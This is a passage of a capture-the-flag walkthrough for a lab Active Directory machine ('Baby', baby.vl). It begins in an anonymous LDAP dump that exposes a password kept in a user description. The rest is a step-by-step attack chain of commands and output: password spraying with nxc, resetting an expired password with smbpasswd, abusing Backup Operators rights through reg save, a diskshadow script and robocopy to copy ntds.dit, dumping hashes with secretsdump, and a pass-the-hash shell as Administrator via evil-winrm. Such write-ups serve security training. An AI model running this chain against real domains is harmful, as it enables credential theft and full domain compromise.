objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Leonard Dyer
sn: Dyer
givenName: Leonard
distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Leonard Dyer
uSNCreated: 12823
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12828
name: Leonard Dyer
objectGUID:: VkMQnkPgw0GAkDCiq9LOhA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810635678033
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Leonard.Dyer
sAMAccountType: 805306368
userPrincipalName: Leonard.Dyer@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ian Walker, dev, baby.vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl

# it, Users, baby.vl
dn: CN=it,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: it
member: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
member: CN=Teresa Bell,OU=it,DC=baby,DC=vl
member: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
member: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
member: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
distinguishedName: CN=it,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20240727221156.0Z
displayName: it
uSNCreated: 12845
memberOf: CN=Remote Management Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 40986
name: it
objectGUID:: qeenEG1110W2UCafhBWyfA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVQQAAA==
sAMAccountName: it
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Connor Wilkinson
sn: Wilkinson
givenName: Connor
distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Connor Wilkinson
uSNCreated: 12849
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12854
name: Connor Wilkinson
objectGUID:: CSm4NoxCPEGpnplkzZapcw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810684117255
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Connor.Wilkinson
sAMAccountType: 805306368
userPrincipalName: Connor.Wilkinson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Hughes
sn: Hughes
givenName: Joseph
distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Joseph Hughes
uSNCreated: 12869
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12874
name: Joseph Hughes
objectGUID:: ro0OQulY1U+EZmNSj15XBw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810685992446
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Joseph.Hughes
sAMAccountType: 805306368
userPrincipalName: Joseph.Hughes@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Kerry Wilson
sn: Wilson
givenName: Kerry
distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Kerry Wilson
uSNCreated: 12879
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12884
name: Kerry Wilson
objectGUID:: vZ3N44jyakmXClchAicbbg==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810686929995
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Kerry.Wilson
sAMAccountType: 805306368
userPrincipalName: Kerry.Wilson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 40
# numEntries: 36
# numReferences: 3

```
The above result show that we can access ldap via anonymous access
# Analysis from ldap
- Users found from ldap: 
```
cat ldap|grep dn:| awk -F 'CN=' '{print $2}'|awk -F ',' '{print $1}' >users.txt
```
Note that from samaccount we got that users do have format of firstname.lastname
Output
```
dev
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```
- Interesting thing from user Teresa
![[/assets/img/VL/interested1.png]]
# FOOTHOLD
- Since we found password from description of user 'Teresa' then we will do Password spray attack on all users
```
└─$ nxc smb 10.10.65.1 -u users -p 'BabyStart123!' --continue-on-success
SMB         10.10.65.1      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

- During password spray, it is found that Caroline user with status of 'PASSWORD MUST CHANGE' and let try change password with smbpasswd and New SMB password will P@55w0rd
```
└─$ smbpasswd -r 10.10.65.1 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson

```
- We are able to login as User Caroline with password that we changed to.
# Privilege Escalation
- Let try with user Caroline and if it failed then will go check other ports
With
```
whoami /all
```

```
Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```
Interesting things are
- The user caroline is backup operators with 2 privileges enabled **SeBackupPrivilege** and **SeRestorePrivilege**
- The user caroline is in group of **it**

## Exploit Backup Operators
- To exploit backup operators, the following 
```
User needed to be backup operators
User need to have privileges of SeBackupPrivilege and SeRestorePrivilege
```
- First backup sam and system and download them to our machines
```
cd C:\windows\tasks
reg save hklm\sam C:\windows\tasks\sam
reg save hklm\system C:\windows\tasks\system
download C:\windows\tasks\sam
download C:\windows\tasks\system 
```
- Second backup ntds
- We will use this lines.Just copy and save them to file called script.txt
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```
- After save it, make it to format of windows
```
unix2dos script.txt
```
- Transfer to vulnerable machine
```
upload script.txt
```
- Diskshadow( create fake disk with backup of ntds)
```
diskshadow /s script.txt
```
- Copy ntds to our current directories
```
robocopy /b E:\windows\ntds . ntds.dit
```
- Download ntds to our machines
```
download ntds.dit
```
- Dumping hashes
```
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```
Output
```
└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:ea9cb3a3c71bc6470ed44111645a1893:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
```
- Now that we have hash, then we can exploit use pass the hash
```
┌──(kali㉿kali)-[~/vulnlab/Baby]
└─$ evil-winrm -i 10.10.65.1 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/21/2021   3:22 PM             36 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
![[/assets/img/VL/compromised.png]]

![[/assets/img/VL/achieved.png]]
